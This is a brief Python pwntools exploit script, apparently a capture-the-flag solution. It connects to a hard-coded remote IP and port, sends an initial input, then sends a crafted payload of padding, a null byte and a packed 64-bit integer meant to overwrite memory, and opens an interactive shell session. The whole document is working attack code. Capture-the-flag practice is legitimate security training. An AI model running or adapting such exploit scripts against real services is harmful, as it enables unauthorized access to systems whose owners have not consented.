from pwn import *

payload = 'a'*7 + '\x00' + p64(1926)

p = remote('220.249.52.133','48336')
p.recvline()
p.sendline('123')
p.recvline()
p.sendline(payload)
p.interactive()

